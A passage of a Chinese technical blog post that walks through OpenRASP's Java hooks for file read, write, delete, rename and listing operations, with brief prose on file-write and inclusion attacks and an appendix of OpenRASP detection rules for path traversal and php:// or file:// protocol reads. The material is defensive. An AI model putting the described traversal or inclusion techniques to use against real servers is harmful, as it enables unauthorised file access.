class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Ljava/lang/String;)V&quot;</span>), readSrc);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRandomAccessReadHook#checkReadFile方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkReadFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.getName().endsWith(<span class="string">&quot;.jar&quot;</span>) &amp;&amp; !file.getName().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">        FileInputStreamHook.checkReadFile(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NioFilesReadHook"><a href="#NioFilesReadHook" class="headerlink" title="NioFilesReadHook"></a>NioFilesReadHook</h4><ul><li>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</li><li>hook类：NioFilesReadHook</li></ul><p>​NIO (New lO)可以理解为非阻塞IO，传统的IO的read和write只能阻塞执行，线程在读写IO期间不能干其他事情，比如调用socket.read()时，如果服务器一直没有数据传输过来，线程就一直阻塞，而NIO中可以配置socket为非阻塞模式。NIO支持面向缓冲区的、基于通道的IO操作，三大核心部分为Channel(通道)，Buffer(缓冲区), Selector(选择器)。业务代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://blog.csdn.net/K_520_W/article/details/123454627</span></span><br><span class="line"><span class="comment">//业务代码</span></span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">response.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;fileName=&quot;</span>+fileName);</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(downloadPath,fileName);</span><br><span class="line"><span class="comment">// 1、定义一个文件字节输入流与源文件接通</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"><span class="comment">// 2.获取文件相应的channel，channel中会有相关数据</span></span><br><span class="line"><span class="type">FileChannel</span> <span class="variable">channel</span> <span class="operator">=</span> fileInputStream.getChannel();</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"><span class="comment">// 3.将channel的数据读取到buffer</span></span><br><span class="line">channel.read(buffer);</span><br><span class="line">os.write(buffer.array());</span><br><span class="line">fileInputStream.close();</span><br><span class="line"><span class="comment">//这里的业务代码，先不涉及readAllByte、newInputStream、newByteChannel方法的使用，而是最简单的demo，该demo会被FileInputStreamHook截住</span></span><br></pre></td></tr></table></figure><p>​将检测代码checkNioReadFile插入到java&#x2F;nio&#x2F;file&#x2F;Files的readAllByte、newInputStream方法执行前，从业务代码可知，NioFiles形式的文件读取会使用new FileInputStream，这就会落入FileInputStream构造器中的检测代码，这里是对NioFiles的一些特殊方法进行插桩补充检测能力。在检测代码checkNioReadFile中，会先将应用方法（如readAllBytes）的参数path通过反射转换为File实例，解析出相对路径path、绝对路径realpath和栈信息stackInfo（？）放入params，交给HookHandler.doCheck处理。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesReadHook.class, <span class="string">&quot;checkNioReadFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;readAllBytes&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)[B&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newInputStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line"><span class="comment">//读写channel</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesReadHook#checkNioReadFile方法）</span></span><br><span class="line">File file= (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;); <span class="comment">//</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.READFILE, params);</span><br></pre></td></tr></table></figure><h2 id="文件写入漏洞"><a href="#文件写入漏洞" class="headerlink" title="文件写入漏洞"></a>文件写入漏洞</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>​文件写入与文件上传比较相似，不同的是，文件写入并非真正要上传一个文件，而是将原本要上传的文件中的代码，通过web站点的某些功能直接写入服务器。比如某些站点后台可以“设置错误页面”，这时候就可能有两种攻击方式：</p><ul><li>在错误页面内容中写入存储型XSS。</li><li>路径可控，将错误页面路径设置为服务器内某些重要文件的路径，从而覆盖该文件内容。</li></ul><h3 id="OpenRASP检测流程-1"><a href="#OpenRASP检测流程-1" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><p>​由于文件操作类型的漏洞，基本和任意文件读取漏洞类似，都是服务端文件路径可控，接下来只记录OpenRASP的处理逻辑。</p><h4 id="FileOutputStreamHook"><a href="#FileOutputStreamHook" class="headerlink" title="FileOutputStreamHook"></a>FileOutputStreamHook</h4><p>应用类：java&#x2F;io&#x2F;FileOutputStream</p><p>hook类：FileOutputStreamHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileOutputStreamHook.class, <span class="string">&quot;checkWriteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Z)V&quot;</span>), src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileOutputStreamHook#checkWriteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="FileRandomAccessWriteHook"><a href="#FileRandomAccessWriteHook" class="headerlink" title="FileRandomAccessWriteHook"></a>FileRandomAccessWriteHook</h4><p>应用类：java&#x2F;io&#x2F;RandomAccessFile</p><p>hook类：FileRandomAccessWriteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">writeSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileRandomAccessWriteHook.class, <span class="string">&quot;checkWriteFile&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, File.class, String.class);</span><br><span class="line">insertBefore(ctClass.getConstructor(<span class="string">&quot;(Ljava/io/File;Ljava/lang/String;)V&quot;</span>), writeSrc);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRandomAccessWriteHook#checkWriteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesWriteHook"><a href="#NioFilesWriteHook" class="headerlink" title="NioFilesWriteHook"></a>NioFilesWriteHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesWriteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesWriteHook.class, <span class="string">&quot;checkNioWriteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createFile&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newOutputStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/io/OutputStream;&quot;</span>, src);</span><br><span class="line"><span class="comment">//创建目录  待确认</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createDirectory&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line"><span class="comment">//读写channel,一般不会直接使用，暂不hook</span></span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newByteChannel&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;[Ljava/nio/file/OpenOption;)Ljava/nio/channels/SeekableByteChannel;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesWriteHook#checkNioWriteFile方法）</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, FileUtil.getRealPath(file));</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.WRITEFILE, params);   </span><br></pre></td></tr></table></figure><h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><h3 id="OpenRASP检测流程-2"><a href="#OpenRASP检测流程-2" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileDeleteHook"><a href="#FileDeleteHook" class="headerlink" title="FileDeleteHook"></a>FileDeleteHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileDeleteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileDeleteHook.class, <span class="string">&quot;checkDeleteFile&quot;</span>, <span class="string">&quot;$0&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;()Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileDeleteHook#checkDeleteFile方法）</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> file.getPath();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, path);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DELETEFILE, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesDeleteHook"><a href="#NioFilesDeleteHook" class="headerlink" title="NioFilesDeleteHook"></a>NioFilesDeleteHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesDeleteHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesDeleteHook.class, <span class="string">&quot;checkDeleteFile&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;delete&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)V&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;deleteIfExists&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesDeleteHook#checkDeleteFile方法）</span></span><br><span class="line">File file=(File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DELETEFILE, params);</span><br></pre></td></tr></table></figure><h2 id="文件重命名漏洞（重命名为webshell）"><a href="#文件重命名漏洞（重命名为webshell）" class="headerlink" title="文件重命名漏洞（重命名为webshell）"></a>文件重命名漏洞（重命名为webshell）</h2><h3 id="OpenRASP检测流程-3"><a href="#OpenRASP检测流程-3" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileRenameHook"><a href="#FileRenameHook" class="headerlink" title="FileRenameHook"></a>FileRenameHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileRenameHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileRenameHook.class, <span class="string">&quot;checkFileRename&quot;</span>, <span class="string">&quot;$0,$1&quot;</span>, File.class, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;renameTo&quot;</span>, <span class="string">&quot;(Ljava/io/File;)Z&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileRenameHook#checkFileRename方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkFileRename</span><span class="params">(File source, File dest)</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (source != <span class="literal">null</span> &amp;&amp; !source.isDirectory() &amp;&amp; dest != <span class="literal">null</span> &amp;&amp; !dest.isDirectory()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        params.put(<span class="string">&quot;source&quot;</span>, source.getAbsolutePath());</span><br><span class="line">        params.put(<span class="string">&quot;dest&quot;</span>, dest.getAbsolutePath());</span><br><span class="line">        HookHandler.doCheck(CheckParameter.Type.RENAME, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="NioFilesRenameHook"><a href="#NioFilesRenameHook" class="headerlink" title="NioFilesRenameHook"></a>NioFilesRenameHook</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileRename&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, Object.class, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;copy&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;move&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">srcLinkHard</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileLink&quot;</span>, <span class="string">&quot;$1,$2,&quot;</span> + <span class="string">&quot;\&quot;hard\&quot;&quot;</span>, Object.class, Object.class,String.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createLink&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;)Ljava/nio/file/Path;&quot;</span>, srcLinkHard);</span><br><span class="line"><span class="type">String</span> <span class="variable">srcLinkSoft</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesRenameHook.class, <span class="string">&quot;checkFileLink&quot;</span>, <span class="string">&quot;$1,$2,&quot;</span> + <span class="string">&quot;\&quot;soft\&quot;&quot;</span>, Object.class, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;createSymbolicLink&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;&quot;</span>, srcLinkSoft);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesRenameHook#checkFileRename方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkFileRename</span><span class="params">(Object pathSource, Object pathDest)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    fileSource = (File) Reflection.invokeMethod(pathSource, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">    fileDest = (File) Reflection.invokeMethod(pathDest, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fileSource != <span class="literal">null</span> &amp;&amp; fileDest != <span class="literal">null</span> &amp;&amp; !fileSource.isDirectory() &amp;&amp; !fileDest.isDirectory()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        params.put(<span class="string">&quot;source&quot;</span>, fileSource.getAbsolutePath());</span><br><span class="line">        params.put(<span class="string">&quot;dest&quot;</span>, fileDest.getAbsolutePath());</span><br><span class="line">        HookHandler.doCheck(CheckParameter.Type.RENAME, params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件目录列出"><a href="#文件目录列出" class="headerlink" title="文件目录列出"></a>文件目录列出</h2><h3 id="OpenRASP检测流程-4"><a href="#OpenRASP检测流程-4" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h3><h4 id="FileHook"><a href="#FileHook" class="headerlink" title="FileHook"></a>FileHook</h4><p>应用类：java&#x2F;io&#x2F;File</p><p>hook类：FileHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileHook.class, <span class="string">&quot;checkListFiles&quot;</span>, <span class="string">&quot;$0&quot;</span>, File.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;()[Ljava/lang/String;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于FileHook#checkListFiles方法）</span></span><br><span class="line">params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DIRECTORY, params);</span><br></pre></td></tr></table></figure><h4 id="NioFilesListHook"><a href="#NioFilesListHook" class="headerlink" title="NioFilesListHook"></a>NioFilesListHook</h4><p>应用类：java&#x2F;nio&#x2F;file&#x2F;Files</p><p>hook类：NioFilesListHook</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(NioFilesListHook.class, <span class="string">&quot;checkFileList&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;newDirectoryStream&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;)Ljava/nio/file/DirectoryStream;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;walk&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;I[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;walkFileTree&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;Ljava/util/Set;ILjava/nio/file/FileVisitor;)Ljava/nio/file/Path;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;(Ljava/nio/file/Path;ILjava/util/function/BiPredicate;[Ljava/nio/file/FileVisitOption;)Ljava/util/stream/Stream;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------ </span><br><span class="line"><span class="comment">//（位于NioFilesListHook#checkFileList方法）</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> (File) Reflection.invokeMethod(path, <span class="string">&quot;toFile&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;path&quot;</span>, file.getPath());</span><br><span class="line">List&lt;String&gt; stackInfo = StackTrace.getParamStackTraceArray();</span><br><span class="line">params.put(<span class="string">&quot;stack&quot;</span>, stackInfo);</span><br><span class="line">params.put(<span class="string">&quot;realpath&quot;</span>, file.getAbsolutePath());</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.DIRECTORY, params);</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>​文件包含漏洞通常出现在由PHP编写的Web应用中，攻击者可以通过PHP中的某些包含函数，去包含一个含有攻击代码的恶意文件，在包含这个文件后，由于PHP包含函数的特性，无论包含的是什么类型的文件，都会将所包含的文件当作PHP代码去解释执行。也就是说，攻击者可能上传一个木马后缀是txt或者jpg的一句话木马，上传后利用文件包含漏洞去包含这个一句话木马文件，就可以成功拿到Shell了。</p><p>​Java中包含其他文件的方式是JSP文件包含，分为静态包含和动态包含两种：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态包含：%<span class="meta">@include</span> file=<span class="string">&quot;test.jsp&quot;</span>%</span><br><span class="line">动态包含：&lt;jsp:include page=<span class="string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;</span><br><span class="line">    &lt;c:<span class="keyword">import</span> url=<span class="string">&quot;&lt;%=url%&gt;&quot;</span>&lt;/c:<span class="keyword">import</span>&gt;</span><br></pre></td></tr></table></figure><p>​动态文件包含中file是可以动态赋值的，可以指向上面说的后缀为txt的一句话木马的路径，但是，Java并不会将非jsp文件当作代码去执行，如果该路径就是.jsp，完全可以直接访问利用，此时不需要文件包含漏洞。可以说，Java文件包含漏洞利用最合适的场景，是某些框架的特性，能把非jsp代码解析成jsp代码去执行。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="任意文件读取–检测算法"><a href="#任意文件读取–检测算法" class="headerlink" title="任意文件读取–检测算法"></a>任意文件读取–检测算法</h3><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 任意文件下载防护 - 来自用户输入</span></span><br><span class="line"><span class="attr">readFile_userinput</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:       <span class="string">&#x27;算法1 - 用户输入匹配算法&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:     <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">lcs_search</span>: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 file_get_contents 等函数读取 http(s):// 内容（注意，这里不区分是否为内网地址）</span></span><br><span class="line"><span class="attr">readFile_userinput_http</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 用户输入匹配算法 + http 协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 file_get_contents 等函数读取 file://、php:// 协议</span></span><br><span class="line"><span class="attr">readFile_userinput_unwanted</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - 拦截 php:// 等异常协议&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 使用 ../../ 跳出 web 目录读取敏感文件</span></span><br><span class="line"><span class="attr">readFile_outsideWebroot</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法4 - 禁止使用 ../../ 访问web目录以外的文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;ignore&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-out-webroot&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 任意文件下载防护 - 读取敏感文件，最后一道防线</span></span><br><span class="line"><span class="attr">readFile_unwanted</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法5 - 文件探针算法&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;log&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;readFile&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> server    = context.<span class="property">server</span></span><br><span class="line">        <span class="keyword">var</span> is_win    = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// weblogic/tongweb 下面，所有war包读取操作全部忽略</span></span><br><span class="line">        <span class="keyword">if</span> (server[<span class="string">&#x27;server&#x27;</span>] === <span class="string">&#x27;weblogic&#x27;</span> || server[<span class="string">&#x27;server&#x27;</span>] == <span class="string">&#x27;tongweb&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.war&#x27;</span>) || params.<span class="property">realpath</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ear&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> clean;</span><br><span class="line">            